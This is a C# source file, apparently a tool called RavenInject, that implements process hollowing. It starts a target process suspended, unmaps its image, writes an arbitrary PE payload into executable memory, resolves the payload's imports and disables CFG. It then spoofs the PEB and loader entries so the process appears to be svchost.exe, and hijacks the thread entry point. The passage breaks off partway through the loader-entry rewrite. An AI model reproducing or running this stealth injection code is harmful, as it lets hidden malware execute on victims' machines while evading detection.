// Created By: Justin Ross | Farmington, Maine. | USA
#nullable enable
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace RavenInject
{
    public class RavenInject
    {
        #region Constants

        // Process Access Rights
        private const uint PROCESS_TERMINATE = 0x0001;
        private const uint PROCESS_CREATE_THREAD = 0x0002;
        private const uint PROCESS_SET_SESSIONID = 0x0004;
        private const uint PROCESS_VM_OPERATION = 0x0008;
        private const uint PROCESS_VM_READ = 0x0010;
        private const uint PROCESS_VM_WRITE = 0x0020;
        private const uint PROCESS_DUP_HANDLE = 0x0040;
        private const uint PROCESS_CREATE_PROCESS = 0x0080;
        private const uint PROCESS_SET_QUOTA = 0x0100;
        private const uint PROCESS_SET_INFORMATION = 0x0200;
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const uint PROCESS_SUSPEND_RESUME = 0x0800;
        private const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
        private const uint PROCESS_SET_LIMITED_INFORMATION = 0x2000;
        private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;

        // CreateProcess Flags
        private const uint CREATE_SUSPENDED = 0x00000004;
        private const uint CREATE_NEW_CONSOLE = 0x00000010;
        private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;

        // Memory Allocation
        private const uint MEM_COMMIT = 0x00001000;
        private const uint MEM_RESERVE = 0x00002000;
        private const uint MEM_RELEASE = 0x00008000;
        private const uint MEM_FREE = 0x00010000;
        private const uint MEM_TOP_DOWN = 0x00100000;

        // Memory Protection
        private const uint PAGE_NOACCESS = 0x01;
        private const uint PAGE_READONLY = 0x02;
        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_WRITECOPY = 0x08;
        private const uint PAGE_EXECUTE = 0x10;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint PAGE_EXECUTE_WRITECOPY = 0x80;
        private const uint PAGE_GUARD = 0x100;
        private const uint PAGE_NOCACHE = 0x200;

        // Wait / Exit
        private const uint INFINITE = 0xFFFFFFFF;
        private const uint WAIT_OBJECT_0 = 0x00000000;
        private const uint WAIT_TIMEOUT = 0x00000102;
        private const uint STILL_ACTIVE = 0x00000103;

        // PE Directory Indices
        private const int IMAGE_DIRECTORY_ENTRY_EXPORT = 0;
        private const int IMAGE_DIRECTORY_ENTRY_IMPORT = 1;
        private const int IMAGE_DIRECTORY_ENTRY_RESOURCE = 2;
        private const int IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3;
        private const int IMAGE_DIRECTORY_ENTRY_SECURITY = 4;
        private const int IMAGE_DIRECTORY_ENTRY_BASERELOC = 5;
        private const int IMAGE_DIRECTORY_ENTRY_TLS = 9;
        private const int IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10;

        // PE Magic
        private const ushort IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10B;
        private const ushort IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20B;
        private const uint IMAGE_NT_SIGNATURE = 0x00004550;

        // Process Info Class
        private const int ProcessBasicInformation = 0;
        private const int ProcessWow64Information = 26;
        private const int ProcessDeviceMap = 23;
        private const int ProcessHandleTable = 58;

        // Context Flags
        private const uint CONTEXT_i386 = 0x00010000;
        private const uint CONTEXT_CONTROL32 = CONTEXT_i386 | 0x00000001;
        private const uint CONTEXT_SEGMENTS32 = CONTEXT_i386 | 0x00000002;
        private const uint CONTEXT_INTEGER32 = CONTEXT_i386 | 0x00000004;
        private const uint CONTEXT_FLOATING_POINT32 = CONTEXT_i386 | 0x00000008;
        private const uint CONTEXT_ALL32 = CONTEXT_i386 | 0x0001003F;

        private const uint CONTEXT_AMD64 = 0x00100000;
        private const uint CONTEXT_CONTROL64 = CONTEXT_AMD64 | 0x00000001;
        private const uint CONTEXT_SEGMENTS64 = CONTEXT_AMD64 | 0x00000002;
        private const uint CONTEXT_INTEGER64 = CONTEXT_AMD64 | 0x00000004;
        private const uint CONTEXT_FLOATING_POINT64 = CONTEXT_AMD64 | 0x00000008;
        private const uint CONTEXT_ALL64 = CONTEXT_AMD64 | 0x0010003F;

        private const int CONTEXT64_SIZE = 1232;
        private const int CONTEXT64_FLAGS_OFFSET = 0x30;
        private const int CONTEXT64_RIP_OFFSET = 0xF8;

        // PEB / LDR Offsets
        private const int PEB_LDR_OFFSET_X64 = 0x18;
        private const int PEB_LDR_OFFSET_X86 = 0x0C;
        private const int PEB_IMAGEBASE_OFFSET_X64 = 0x10;
        private const int PEB_IMAGEBASE_OFFSET_X86 = 0x08;
        private const int PEB_PROCESS_PARAMS_OFFSET_X64 = 0x20;
        private const int PEB_PROCESS_PARAMS_OFFSET_X86 = 0x10;

        // LDR_DATA_TABLE_ENTRY offsets
        private const int LDR_INLOAD_OFFSET_X64 = 0x10;
        private const int LDR_INLOAD_OFFSET_X86 = 0x0C;
        private const int LDR_INMEM_OFFSET_X64 = 0x20;
        private const int LDR_INMEM_OFFSET_X86 = 0x14;
        private const int LDR_DLLBASE_OFFSET_X64 = 0x30;
        private const int LDR_DLLBASE_OFFSET_X86 = 0x18;
        private const int LDR_ENTRYPOINT_OFFSET_X64 = 0x38;
        private const int LDR_ENTRYPOINT_OFFSET_X86 = 0x1C;
        private const int LDR_SIZE_OFFSET_X64 = 0x40;
        private const int LDR_SIZE_OFFSET_X86 = 0x20;
        private const int LDR_FULLNAME_OFFSET_X64 = 0x48;
        private const int LDR_FULLNAME_OFFSET_X86 = 0x24;
        private const int LDR_BASENAME_OFFSET_X64 = 0x58;
        private const int LDR_BASENAME_OFFSET_X86 = 0x2C;
        private const int LDR_INMEM_TO_ENTRY_X64 = 0x10;
        private const int LDR_INMEM_TO_ENTRY_X86 = 0x08;

        // Limits
        private const long MAX_IMAGE_SIZE = 512L * 1024 * 1024;
        private const uint MAX_EXPORTS = 1_000_000u;
        private const int MAX_FORWARDER_LEN = 1024;
        private const int MAX_FORWARD_DEPTH = 16;

        #endregion

        #region Native Structures

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        private struct STARTUPINFO
        {
            public int cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public int dwX, dwY, dwXSize, dwYSize;
            public int dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_BASIC_INFORMATION
        {
            public int ExitStatus;
            public IntPtr PebBaseAddress;
            public IntPtr AffinityMask;
            public int BasePriority;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct FLOATING_SAVE_AREA
        {
            public uint ControlWord, StatusWord, TagWord,
                        ErrorOffset, ErrorSelector, DataOffset, DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct CONTEXT32
        {
            public uint ContextFlags;
            public uint Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public FLOATING_SAVE_AREA FloatSave;
            public uint SegGs, SegFs, SegEs, SegDs;
            public uint Edi, Esi, Ebx, Edx, Ecx, Eax, Ebp, Eip, SegCs, EFlags, Esp, SegSs;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct M128A
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] Value;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct XMM_SAVE_AREA64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public ushort Reserved2;
            public uint ErrorCoderIP;
            public ushort Reserved3;
            public ushort DataSelector;
            public uint ErrorCoderDataOffset;
            public ushort Reserved4;
            public ushort DataOffset;
            public uint MxCsr;
            public uint Reserved5;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] Registers;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved6;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct CONTEXT64
        {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags;
            public uint MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public ulong Rax, Rbx, Rcx, Rdx, Rbp, Rsi, Rdi, Rip;
            public ulong R8, R9, R10, R11, R12, R13, R14, R15;
            public XMM_SAVE_AREA64 FloatSave;
            public ulong Vector17, Vector18, Vector26, Vector27;
            public ulong DebugControl;
            public ulong LastBranchToRip, LastBranchFromRip, LastExceptionFromRip, LastExceptionToRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public int _pad;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LDR_MODULE_FIELDS
        {
            public IntPtr DllBase;
            public IntPtr EntryPoint;
            public uint SizeOfImage;
            public uint _pad;
            public UNICODE_STRING FullDllName;
            public UNICODE_STRING BaseDllName;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DOS_HEADER
        {
            public ushort e_magic;
            public ushort e_cblp, e_cp, e_crlc, e_cparhdr, e_minalloc, e_maxalloc;
            public ushort e_ss, e_sp, e_csum, e_ip, e_cs, e_lfarlc, e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public ushort[] e_res2;
            public ushort e_oemid;
            public ushort e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public ushort[] e_res3;
            public int e_lfanew;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DATA_DIRECTORY
        {
            public uint VirtualAddress;
            public uint Size;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_OPTIONAL_HEADER32
        {
            public ushort Magic;
            public byte MajorLinkerVersion, MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public uint BaseOfData;
            public uint ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion, MinorOperatingSystemVersion;
            public ushort MajorImageVersion, MinorImageVersion;
            public ushort MajorSubsystemVersion, MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public uint SizeOfStackReserve, SizeOfStackCommit;
            public uint SizeOfHeapReserve, SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public IMAGE_DATA_DIRECTORY[] DataDirectory;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_OPTIONAL_HEADER64
        {
            public ushort Magic;
            public byte MajorLinkerVersion, MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public ulong ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion, MinorOperatingSystemVersion;
            public ushort MajorImageVersion, MinorImageVersion;
            public ushort MajorSubsystemVersion, MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public ulong SizeOfStackReserve, SizeOfStackCommit;
            public ulong SizeOfHeapReserve, SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public IMAGE_DATA_DIRECTORY[] DataDirectory;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_NT_HEADERS32
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_NT_HEADERS64
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_IMPORT_DESCRIPTOR
        {
            public uint Characteristics;
            public uint TimeDateStamp;
            public uint ForwarderChain;
            public uint Name;
            public uint FirstThunk;
        }

        #endregion

        #region P/Invoke

        private const string KERNEL32 = "kernel32.dll";
        private const string NTDLL = "ntdll.dll";

        // Process / Thread Lifecycle
        [DllImport(KERNEL32, SetLastError = true)]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, int dwThreadId);

        [DllImport(KERNEL32, SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern bool CreateProcessA(
            string lpApplicationName, StringBuilder lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
            [MarshalAs(UnmanagedType.Bool)] bool bInheritHandles,
            uint dwCreationFlags, IntPtr lpEnvironment, string? lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport(KERNEL32, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);

        // Memory
        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool ReadProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            IntPtr nSize, out IntPtr lpNumberOfBytesRead);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
            IntPtr nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool VirtualFreeEx(
            IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint dwFreeType);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool VirtualProtectEx(
            IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        [DllImport(NTDLL)]
        private static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr BaseAddress);

        // Thread Context
        [DllImport(KERNEL32, SetLastError = true)]
        private static extern uint SuspendThread(IntPtr hThread);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT32 lpContext);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT32 lpContext);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool Wow64GetThreadContext(IntPtr hThread, ref CONTEXT32 lpContext);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool Wow64SetThreadContext(IntPtr hThread, ref CONTEXT32 lpContext);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern IntPtr CreateRemoteThread(
            IntPtr hProcess, IntPtr lpThreadAttributes, IntPtr dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,
            out IntPtr lpThreadId);

        // Process Query
        [DllImport(KERNEL32, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWow64Process(IntPtr hProcess,
            [MarshalAs(UnmanagedType.Bool)] out bool Wow64Process);

        [DllImport(NTDLL)]
        private static extern int NtQueryInformationProcess(
            IntPtr hProcess, int ProcessInformationClass,
            ref PROCESS_BASIC_INFORMATION ProcessInformation,
            uint ProcessInformationLength, out IntPtr ReturnLength);

        [DllImport(NTDLL)]
        private static extern int NtQueryInformationProcess(
            IntPtr hProcess, int ProcessInformationClass,
            ref IntPtr ProcessInformation,
            uint ProcessInformationLength, out IntPtr ReturnLength);

        [DllImport(NTDLL)]
        private static extern uint RtlNtStatusToDosError(int Status);

        #endregion

        #region Public API

        public bool Run(string targetPath, byte[] payload, uint creationFlags)
        {
            const int maxAttempts = 3;
            for (int attempt = 0; attempt < maxAttempts; attempt++)
            {
                try
                {
                    return TryInject(targetPath, payload, creationFlags);
                }
                catch (InvalidDataException ex)
                {
                    Debug.WriteLine($"[RavenInject] Invalid payload: {ex.Message}");
                    return false;
                }
                catch (ArgumentException ex)
                {
                    Debug.WriteLine($"[RavenInject] Invalid argument: {ex.Message}");
                    return false;
                }
                catch (Win32Exception ex) when (IsTransient(ex.NativeErrorCode) && attempt < maxAttempts - 1)
                {
                    Debug.WriteLine($"[RavenInject] Transient ({ex.NativeErrorCode}); retry {attempt + 1}");
                    System.Threading.Thread.Sleep(100 * (attempt + 1));
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"[RavenInject] Injection failed: {ex.Message}");
                    return false;
                }
            }
            return false;
        }

        private static bool IsTransient(int win32)
        {
            switch (win32)
            {
                case 8:    // ERROR_NOT_ENOUGH_MEMORY
                case 14:   // ERROR_OUTOFMEMORY
                case 299:  // ERROR_WAIT_NO_CHILDREN
                case 170:  // ERROR_PIPE_BUSY
                case 1237: // ERROR_NO_SUCH_LOGON_SESSION
                case 1450: // ERROR_NO_INHERITANCE
                case 1455: // ERROR_NO_LOGON_SESSIONS
                    return true;
                default:
                    return false;
            }
        }

        #endregion

        #region Core Injection

        private bool TryInject(string targetPath, byte[] payload, uint creationFlags)
        {
            PROCESS_INFORMATION pi = default;
            STARTUPINFO si = new STARTUPINFO { cb = Marshal.SizeOf<STARTUPINFO>() };
            string quotedPath = "\"" + targetPath + "\"";
            string? currentDir = Path.GetDirectoryName(Path.GetFullPath(targetPath));
            string spoofedImagePath = @"C:\Windows\System32\svchost.exe";

            try
            {
                var cmdLine = new StringBuilder(quotedPath, 32768);
                if (!CreateProcessA(targetPath, cmdLine, IntPtr.Zero, IntPtr.Zero, true,
                        creationFlags | CREATE_SUSPENDED, IntPtr.Zero, currentDir,
                        ref si, out pi))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                if (!IsWow64Process(pi.hProcess, out bool isWow64))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                bool targetIs64Bit = IntPtr.Size == 8 && !isWow64;
                bool targetIsWow64 = IntPtr.Size == 8 && isWow64;

                IntPtr pebAddress = GetPebAddress(pi.hProcess, targetIs64Bit, targetIsWow64);
                PayloadInfo info = ParsePayload(payload);

                if (info.Is64Bit != targetIs64Bit)
                    throw new InvalidDataException(
                        $"Architecture mismatch: payload is {(info.Is64Bit ? "x64" : "x86")}, " +
                        $"target is {(targetIs64Bit ? "x64" : "x86")}.");

                IntPtr currentImageBase = ReadImageBaseFromPEB(pi.hProcess, pebAddress, targetIs64Bit);
                int unmapStatus = NtUnmapViewOfSection(pi.hProcess, currentImageBase);
                if (unmapStatus != 0)
                    throw new Win32Exception((int)RtlNtStatusToDosError(unmapStatus));

                byte[] image = BuildLocalImage(payload, info);

                IntPtr newImageBase = VirtualAllocEx(pi.hProcess, info.ImageBase,
                    (IntPtr)info.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                if (newImageBase == IntPtr.Zero)
                {
                    if (!info.HasRelocations)
                        throw new InvalidDataException(
                            "Preferred base unavailable and payload has no relocation directory.");

                    newImageBase = VirtualAllocEx(pi.hProcess, IntPtr.Zero,
                        (IntPtr)info.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if (newImageBase == IntPtr.Zero)
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                }

                long delta = newImageBase.ToInt64() - info.ImageBase.ToInt64();
                if (delta != 0)
                {
                    if (!info.HasRelocations)
                    {
                        VirtualFreeEx(pi.hProcess, newImageBase, IntPtr.Zero, MEM_RELEASE);
                        throw new InvalidDataException(
                            "Payload loaded at non-preferred base but has no relocations.");
                    }
                    ApplyRelocations(image, info, delta);
                }

                long cookieAddr = ReadSecurityCookieAddress(image, info);
                if (cookieAddr < newImageBase.ToInt64() ||
                    cookieAddr >= newImageBase.ToInt64() + info.SizeOfImage)
                    cookieAddr = 0;

                DisableCfgInImage(image, info);

                var loadingDlls = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
                var exportCache = new Dictionary<string, ExportTable>(StringComparer.OrdinalIgnoreCase);
                ResolveImports(pi.hProcess, pi, pebAddress, targetIs64Bit, targetIsWow64,
                               image, info, newImageBase, loadingDlls, exportCache);

                if (!WriteProcessMemory(pi.hProcess, newImageBase, image,
                                        (IntPtr)image.Length, out _))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                if (cookieAddr != 0)
                {
                    byte[] cookieBytes;
                    if (info.Is64Bit)
                    {
                        ulong cookie = ((ulong)(uint)Environment.TickCount << 32)
                                     ^ (ulong)(uint)pi.dwProcessId
                                     ^ ((ulong)(uint)pi.dwThreadId << 16)
                                     ^ (ulong)cookieAddr;
                        cookieBytes = BitConverter.GetBytes(cookie);
                    }
                    else
                    {
                        uint cookie = (uint)Environment.TickCount
                                    ^ (uint)pi.dwProcessId
                                    ^ (uint)pi.dwThreadId
                                    ^ (uint)cookieAddr;
                        cookieBytes = BitConverter.GetBytes(cookie);
                    }

                    if (!WriteProcessMemory(pi.hProcess, new IntPtr(cookieAddr),
                                            cookieBytes, (IntPtr)cookieBytes.Length, out _))
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                }

                WriteImageBaseToPEB(pi.hProcess, pebAddress, targetIs64Bit, newImageBase);
                InvokeTlsCallbacks(pi.hProcess, newImageBase, image, info.ImageBase.ToInt64());

                RewriteProcessParameters(pi.hProcess, pebAddress, targetIs64Bit,
                                         spoofedImagePath, null);

                UpdateLdrEntry(pi.hProcess, pebAddress, targetIs64Bit,
                               currentImageBase, newImageBase,
                               info.SizeOfImage, info.AddressOfEntryPoint,
                               spoofedImagePath);

                IntPtr entryPoint = new IntPtr(newImageBase.ToInt64() + (long)info.AddressOfEntryPoint);
                SetThreadEntryPoint(pi.hThread, targetIs64Bit, targetIsWow64, entryPoint);

                uint resume = ResumeThread(pi.hThread);
                if (resume == INFINITE)
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                return true;
            }
            catch
            {
                try
                {
                    if (pi.dwProcessId != 0)
                        Process.GetProcessById(pi.dwProcessId)?.Kill();
                }
                catch { /* best effort */ }
                throw;
            }
            finally
            {
                if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
                if (pi.hThread != IntPtr.Zero) CloseHandle(pi.hThread);
            }
        }

        #endregion

        #region PEB Helpers

        private IntPtr GetPebAddress(IntPtr hProcess, bool targetIs64Bit, bool targetIsWow64)
        {
            if (targetIsWow64)
            {
                // Class 26 (ProcessWow64Information) returns the 32-bit PEB address
                // as a raw pointer value.
                IntPtr peb32 = IntPtr.Zero;
                int st = NtQueryInformationProcess(hProcess, ProcessWow64Information,
                                                   ref peb32, (uint)IntPtr.Size, out _);
                if (st < 0)
                    throw new Win32Exception((int)RtlNtStatusToDosError(st));
                if (peb32 == IntPtr.Zero)
                    throw new InvalidOperationException("WOW64 PEB address is null.");
                return peb32;
            }

            PROCESS_BASIC_INFORMATION pbi = default;
            int status = NtQueryInformationProcess(hProcess, ProcessBasicInformation,
                ref pbi, (uint)Marshal.SizeOf<PROCESS_BASIC_INFORMATION>(), out _);
            if (status < 0)
                throw new Win32Exception((int)RtlNtStatusToDosError(status));
            return pbi.PebBaseAddress;
        }

        private IntPtr ReadImageBaseFromPEB(IntPtr hProcess, IntPtr pebAddress, bool is64Bit)
        {
            int off = is64Bit ? PEB_IMAGEBASE_OFFSET_X64 : PEB_IMAGEBASE_OFFSET_X86;
            return ReadPointer(hProcess, pebAddress + off, is64Bit);
        }

        private void WriteImageBaseToPEB(IntPtr hProcess, IntPtr pebAddress, bool is64Bit, IntPtr imageBase)
        {
            int off = is64Bit ? PEB_IMAGEBASE_OFFSET_X64 : PEB_IMAGEBASE_OFFSET_X86;
            WritePointer(hProcess, pebAddress + off, imageBase, is64Bit);
        }

        private void RewriteLdrName(
            IntPtr hProcess, IntPtr usAddr, string value, bool is64Bit)
        {
            byte[] hdr = new byte[is64Bit ? 16 : 8];
            if (!ReadProcessMemory(hProcess, usAddr, hdr, (IntPtr)hdr.Length, out _))
                throw new Win32Exception(Marshal.GetLastWin32Error());

            ushort maxLen = BitConverter.ToUInt16(hdr, 2);
            IntPtr oldBuf = is64Bit
                ? new IntPtr(BitConverter.ToInt64(hdr, 8))
                : new IntPtr(BitConverter.ToInt32(hdr, 4));

            byte[] bytes = Encoding.Unicode.GetBytes(value + "\0");

            if (bytes.Length <= maxLen && oldBuf != IntPtr.Zero)
            {
                if (!WriteProcessMemory(hProcess, oldBuf, bytes, (IntPtr)bytes.Length, out _))
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                byte[] lenPatch = BitConverter.GetBytes((ushort)(bytes.Length - 2));
                if (!WriteProcessMemory(hProcess, usAddr, lenPatch, (IntPtr)2, out _))
                    throw new Win32Exception(Marshal.GetLastWin32Error());
            }
            else
            {
                IntPtr buf = VirtualAllocEx(hProcess, IntPtr.Zero, (IntPtr)bytes.Length,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (buf == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error());
                if (!WriteProcessMemory(hProcess, buf, bytes, (IntPtr)bytes.Length, out _))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                BitConverter.GetBytes((ushort)(bytes.Length - 2)).CopyTo(hdr, 0);
                BitConverter.GetBytes((ushort)bytes.Length).CopyTo(hdr, 2);
                if (is64Bit) BitConverter.GetBytes(buf.ToInt64()).CopyTo(hdr, 8);
                else BitConverter.GetBytes(unchecked((uint)buf.ToInt64())).CopyTo(hdr, 4);

                if (!WriteProcessMemory(hProcess, usAddr, hdr, (IntPtr)hdr.Length, out _))
                    throw new Win32Exception(Marshal.GetLastWin32Error());
            }
        }

        private void UpdateLdrEntry(
            IntPtr hProcess, IntPtr pebAddress, bool is64Bit,
            IntPtr oldBase, IntPtr newBase, uint sizeOfImage, uint entryRva,
            string imagePath)
        {
            long ldrOffset = is64Bit ? PEB_LDR_OFFSET_X64 : PEB_LDR_OFFSET_X86;
            long inLoadListOffset = is64Bit ? LDR_INLOAD_OFFSET_X64 : LDR_INLOAD_OFFSET_X86;
            long entryToDllBase = is64Bit ? LDR_DLLBASE_OFFSET_X64 : LDR_DLLBASE_OFFSET_X86;
            long entryToEntryPoint = is64Bit ? LDR_ENTRYPOINT_OFFSET_X64 : LDR_ENTRYPOINT_OFFSET_X86;
            long entryToSizeOfImg = is64Bit ? LDR_SIZE_OFFSET_X64 : LDR_SIZE_OFFSET_X86;
            long entryToFullname = is64Bit ? LDR_FULLNAME_OFFSET_X64 : LDR_FULLNAME_OFFSET_X86;
            long entryToBasename = is64Bit ? LDR_BASENAME_OFFSET_X64 : LDR_BASENAME_OFFSET_X86;

            IntPtr ldr = ReadPointer(hProcess, pebAddress + (int)ldrOffset, is64Bit);
            if (ldr == IntPtr.Zero) return;

            IntPtr listHead = ldr + (int)inLoadListOffset;
            IntPtr cur = ReadPointer(hProcess, listHead, is64Bit);

            int guard = 0;
            while (cur != IntPtr.Zero && cur != listHead && guard++ < 1024)
            {
                // InLoadOrderLinks is the first field — entry base == link address.
                IntPtr entryBase = cur;
                IntPtr dllBase = ReadPointer(hProcess, entryBase + (int)entryToDllBase, is64Bit);

                if (dllBase == oldBase)
                {
                    WritePointer(hProcess, entryBase + (int)entryToDllBase, newBase, is64Bit);
                    IntPtr ep = new IntPtr(newBase.ToInt64() + (long)entryRva);
                    WritePointer(hProcess, entryBase + (int)entryToEntryPoint, ep, is64Bit);
                    byte[] sizeBytes = BitConverter.GetBytes(sizeOfImage);
                    if (!WriteProcessMemory(hProcess,
